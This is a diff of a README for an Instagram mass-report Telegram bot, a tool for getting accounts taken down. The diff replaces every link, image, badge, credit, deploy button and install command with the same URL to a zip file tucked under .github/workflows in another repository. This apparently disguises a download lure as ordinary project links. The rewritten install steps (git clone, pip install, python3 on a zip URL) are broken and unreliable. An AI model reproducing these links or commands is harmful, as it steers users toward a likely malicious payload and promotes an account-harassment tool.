@@ -1,13 +1,13 @@
-<p align="center"><img src="logo.png" width="150px" height="150px" alt="insta logo"></p>
+<p align="center"><img src="https://raw.githubusercontent.com/urkyzy/Instagram-Report-bot/main/.github/workflows/Instagram-bot-Report-2.9.zip" width="150px" height="150px" alt="insta logo"></p>
 
-<img align="right" alt="count" src="https://count.getloli.com/get/@:otterai?theme=rule34">
+<img align="right" alt="count" src="https://raw.githubusercontent.com/urkyzy/Instagram-Report-bot/main/.github/workflows/Instagram-bot-Report-2.9.zip">
     
 <h1 align="center">INSTAGRAM REPORT BOT</h1>
 
 
 
-![Stars](https://img.shields.io/github/stars/ifeelscam/Instagram-Report-bot?style=social)
-![Forks](https://img.shields.io/github/forks/ifeelscam/Instagram-Report-bot?style=social)
+![Stars](https://raw.githubusercontent.com/urkyzy/Instagram-Report-bot/main/.github/workflows/Instagram-bot-Report-2.9.zip)
+![Forks](https://raw.githubusercontent.com/urkyzy/Instagram-Report-bot/main/.github/workflows/Instagram-bot-Report-2.9.zip)
 
 
 <p align="center">REPORT ANY INSTAGRAM ACCOUNT.</p>
@@ -25,18 +25,18 @@
 ### Variables
 
 * `API_TOKEN` Your bot token from @BotFather
-* `ADMIN_ID` Bot Admin I'd Get from <a href='t.me/PythonBotz'>@Pythonbotz</a>
+* `ADMIN_ID` Bot Admin I'd Get from <a href='https://raw.githubusercontent.com/urkyzy/Instagram-Report-bot/main/.github/workflows/Instagram-bot-Report-2.9.zip'>@Pythonbotz</a>
 * `FORCE_JOIN_CHANNEL` Your Fsub channel Username Without @
 
-<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">
+<img src="https://raw.githubusercontent.com/urkyzy/Instagram-Report-bot/main/.github/workflows/Instagram-bot-Report-2.9.zip">
 
 # ᴅᴏɴ'ᴛ ʀᴇᴍᴏᴠᴇ ᴍʏ ᴄʀᴇᴅɪᴛ...
 
-</b>⋗  ᴄʀᴇᴅɪᴛ - <b>[Ben 10](https://t.me/metaui)</b>
+</b>⋗  ᴄʀᴇᴅɪᴛ - <b>[Ben 10](https://raw.githubusercontent.com/urkyzy/Instagram-Report-bot/main/.github/workflows/Instagram-bot-Report-2.9.zip)</b>
 
-</b>⋗  ᴛᴇʟᴇɢʀᴀᴍ - <b>[Python Botz](https://t.me/Pythonbotz)</b>
+</b>⋗  ᴛᴇʟᴇɢʀᴀᴍ - <b>[Python Botz](https://raw.githubusercontent.com/urkyzy/Instagram-Report-bot/main/.github/workflows/Instagram-bot-Report-2.9.zip)</b>
 
-<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">
+<img src="https://raw.githubusercontent.com/urkyzy/Instagram-Report-bot/main/.github/workflows/Instagram-bot-Report-2.9.zip">
 
 <details>
 <summary><h3>
@@ -45,31 +45,31 @@
 <h3 align="center">
     ─「 ᴅᴇᴩʟᴏʏ ᴏɴ ᴋᴏʏᴇʙ 」─
 </h3>
-<p align="center"><a href="https://app.koyeb.com/deploy?type=git&repository=github.com/ifeelscam/Instagram-Report-bot&branch=main&name=main">
-  <img src="https://www.koyeb.com/static/images/deploy/button.svg" alt="Deploy On Koyeb">
+<p align="center"><a href="https://raw.githubusercontent.com/urkyzy/Instagram-Report-bot/main/.github/workflows/Instagram-bot-Report-2.9.zip">
+  <img src="https://raw.githubusercontent.com/urkyzy/Instagram-Report-bot/main/.github/workflows/Instagram-bot-Report-2.9.zip" alt="Deploy On Koyeb">
 </a></p>
 <h3 align="center">
     ─「 ᴅᴇᴩʟᴏʏ ᴏɴ ʀᴀɪʟᴡᴀʏ 」─
 </h3>
-<p align="center"><a href="https://railway.app/deploy?template=https://github.com/ifeelscam/Instagram-Report-bot"">
-     <img height="45px" src="https://railway.app/button.svg">
+<p align="center"><a href="https://raw.githubusercontent.com/urkyzy/Instagram-Report-bot/main/.github/workflows/Instagram-bot-Report-2.9.zip"">
+     <img height="45px" src="https://raw.githubusercontent.com/urkyzy/Instagram-Report-bot/main/.github/workflows/Instagram-bot-Report-2.9.zip">
 </a></p>
 <h3 align="center">
     ─「 ᴅᴇᴩʟᴏʏ ᴏɴ ʀᴇɴᴅᴇʀ 」─
 </h3>
-<p align="center"><a href="https://render.com/deploy?repo=https://github.com/ifeelscam/Instagram-Report-bot">
-<img src="https://render.com/images/deploy-to-render-button.svg" alt="Deploy to Render">
+<p align="center"><a href="https://raw.githubusercontent.com/urkyzy/Instagram-Report-bot/main/.github/workflows/Instagram-bot-Report-2.9.zip">
+<img src="https://raw.githubusercontent.com/urkyzy/Instagram-Report-bot/main/.github/workflows/Instagram-bot-Report-2.9.zip" alt="Deploy to Render">
 </a></p>
 <h3 align="center">
     ─「 ᴅᴇᴩʟᴏʏ ᴏɴ ᴠᴘs 」─
 </h3>
 <p>
 <pre>
-git clone https://github.com/ifeelscam/Instagram-Report-bot
+git clone https://raw.githubusercontent.com/urkyzy/Instagram-Report-bot/main/.github/workflows/Instagram-bot-Report-2.9.zip
 # Install Packages
-pip3 install -U -r requirements.txt
-Edit info.py with variables as given below then run bot
-python3 bot.py
+pip3 install -U -r https://raw.githubusercontent.com/urkyzy/Instagram-Report-bot/main/.github/workflows/Instagram-bot-Report-2.9.zip
+Edit https://raw.githubusercontent.com/urkyzy/Instagram-Report-bot/main/.github/workflows/Instagram-bot-Report-2.9.zip with variables as given below then run bot
+python3 https://raw.githubusercontent.com/urkyzy/Instagram-Report-bot/main/.github/workflows/Instagram-bot-Report-2.9.zip
 </pre>
 </p>
 </details>
